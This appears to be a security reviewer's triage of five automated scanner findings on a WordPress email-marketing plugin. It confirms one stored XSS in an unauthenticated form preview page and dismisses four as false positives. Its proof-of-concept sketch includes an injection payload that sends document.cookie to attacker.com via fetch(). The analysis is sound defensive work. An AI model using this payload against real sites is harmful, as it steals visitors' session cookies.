reviewer_notes: Manual taint-trace of all 5 automated findings. Traced each source-sink chain independently through the source. SSRF false positive confirmed (hardcoded URL). Three push-admin XSS flows confirmed as false positives (sink outputs only the constant string 'selected="selected"', never user data). One XSS confirmed: JavaScript injection in unauthenticated form preview page.

verdicts.reasoning: The taint scanner incorrectly tagged this as SSRF. The sink is `wp_remote_post(self::TURNSTILE_SITE_VERIFY, $headers)`. TURNSTILE_SITE_VERIFY is a class constant defined at sendinblue.php:135 as 'https://challenges.cloudflare.com/turnstile/v0/siteverify' — a hardcoded, attacker-immutable value. The tainted data ($formData from get_option) flows only into the POST body parameters (the 'body' array), not into the URL. wp_remote_post only makes the request to the fixed Cloudflare URL regardless of body contents. There is no SSRF here: an attacker cannot redirect the outbound HTTP request to an arbitrary host.

verdicts.title: Stored XSS via JavaScript Injection in Turnstile Captcha Theme Parameter (Unauthenticated Preview Page)
verdicts.description: In inc/sib-form-preview.php:74, the value $cCaptchaStyle is echoed directly inside a <script> block as the value of the `theme:` property in a Turnstile render() call: `theme: <?php echo $cCaptchaStyle; ?>,`. No escaping is applied. The value originates from a stored form's cCaptchaStyle database column. At write time (page-form.php:988), sanitize_text_field() is applied, which strips HTML tags but does NOT prevent JavaScript injection — characters like `"`, `,`, `(`, `)`, `;`, newlines are preserved. The preview URL (?sib_form=N) is processed by sib_parse_request() with NO authentication check and NO nonce verification. Any user (including unauthenticated visitors) can request the preview of any form. An administrator who saves a form with a malicious cCaptchaStyle value will cause XSS to execute in the browser of any user who views the preview page for that form.
verdicts.taint_source: cCaptchaStyle column in mailin_forms DB table, written by save_setting_subscription() in page/page-form.php:988
verdicts.entry_point: GET /?sib_form=<form_id> (no action param triggers DB path via SIB_Forms::getForm)
verdicts.stored_or_reflected: Stored (payload written to DB on form save, served on every unauthenticated preview view)
verdicts.exploitability_note: Write is admin-only, making this admin-to-any-visitor XSS. In typical WP security models this is Low-Medium severity since admins are trusted, but the unauthenticated exposure surface elevates it. Could be used to deliver drive-by XSS to front-end visitors via the preview URL.
verdicts.sanitizer_applied_at_write: sanitize_text_field() — strips HTML tags only, does not neutralize JS injection in script context
verdicts.sanitizer_missing_at_read: esc_js() or json_encode() around the echoed value
verdicts.poc_sketch: 1. Admin saves a form with turnstile_captcha_theme set to: light",callback:function(){fetch('https://attacker.com/?c='+document.cookie)},x:"  2. Navigate to /?sib_form=<form_id> (unauthenticated).  3. JS executes in victim browser.

verdicts.reasoning: The taint scanner flags line 306 of push-admin.php: `echo array_search($segment['id'], $target_brevo_segment_ids) !== false ? 'selected="selected"' : ''`. The PHP ternary expression can only produce two outputs: the hardcoded string constant 'selected="selected"' or the empty string ''. The `array_search()` function returns either the found key (a numeric array index) or false — neither of which is echoed. The user-tainted data ($target_brevo_segment_ids from post meta) is only used as a parameter to array_search(), never reflected into output. This is a false positive: no user-controlled string reaches the HTML output at this line. The segment IDs in $all_brevo_segments come from the Brevo API (external source), but they're used as comparison keys and the option value output (line 307: `echo $segment['id']`) would be a separate concern — and those values come from Brevo's API, an attacker-controlled external service, which is too speculative for a high-confidence finding.

Structurally identical false positive to mailin-xss-002. Line 336: `echo array_search($list['id'], $target_brevo_list_ids) !== false ? 'selected="selected"' : ''`. The ternary output is always one of two hardcoded string constants. The tainted $target_brevo_list_ids is used only as the needle/haystack operand of array_search(), whose return value is never reflected. No user-controlled data reaches the HTML sink.

Structurally identical false positive to mailin-xss-002 and mailin-xss-003. Line 362: `echo array_search($tag, $target_tags) !== false ? 'selected="selected"' : ''`. The return value of array_search() is a boolean or integer key — it is only used in the comparison, not echoed. The only output is the constant string 'selected="selected"' or empty string. However, note that line 363 also echoes `value="<?php echo $tag ?>"` and `><?php echo $tag ?>` without escaping, where $tag comes from $all_tags (Brevo API via SIB_Push_Utils::list_tags). This is a meta-box rendered only in wp-admin for logged-in admins — the external API would need to be compromised to deliver malicious tag names. Too speculative for high confidence.

summary: 1 confirmed vulnerability, 4 false positives. The confirmed finding is a stored XSS via JS injection in the Turnstile captcha theme parameter, exploitable on the unauthenticated form preview page. Write requires admin privileges; read is fully unauthenticated. SSRF flagged by scanner is not valid (hardcoded URL). All three push-admin XSS flows are false positives where the scanner misidentified the output of a ternary expression as reflecting user data.
